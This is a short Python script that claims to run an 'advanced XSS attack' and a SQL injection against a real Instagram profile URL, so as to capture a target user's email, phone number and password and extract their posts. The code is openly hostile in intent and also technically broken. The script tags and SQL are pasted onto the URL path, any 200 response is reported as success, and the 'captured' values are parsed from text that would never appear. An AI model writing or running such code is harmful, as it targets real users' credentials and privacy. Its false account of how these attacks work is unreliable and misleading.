import requests
import re

# Set up the target user's profile URL
target_user = "example_username"
profile_url = f"https://www.instagram.com/{target_user}/"

# Perform an advanced XSS attack to capture email, phone number, and password
xss_payload = "<script>var email=document.getElementById('email').value;var phone=document.getElementById('phone').value;var password=document.getElementById('password').value;alert('Captured Info:\\nEmail: '+email+'\\nPhone: '+phone+'\\nPassword: '+password);</script>"
response = requests.get(profile_url + xss_payload)

if response.status_code == 200:
    print("Advanced XSS attack successful!")

    # Extract the captured email, phone number, and password from the response
    email = re.search(r"Email: (.*?)\\n", response.text).group(1)
    phone = re.search(r"Phone: (.*?)\\n", response.text).group(1)
    password = re.search(r"Password: (.*?)\"", response.text).group(1)

    print("Captured Info:")
    print("Email:", email)
    print("Phone:", phone)
    print("Password:", password)
else:
    print("Advanced XSS attack failed.")

# Perform an SQL injection attack to extract posts made by the target user
sql_injection_payload = " UNION SELECT post_id, post_content FROM posts WHERE username='" + target_user + "'"
response = requests.get(profile_url + sql_injection_payload)

if response.status_code == 200:
    print("SQL injection successful!")

    # Extract the posts made by the target user
    posts = re.findall(r"\d+,(.*)", response.text)

    print("Posts made by the target user:")
    for post in posts:
        print(post)
else:
    print("SQL injection failed.")
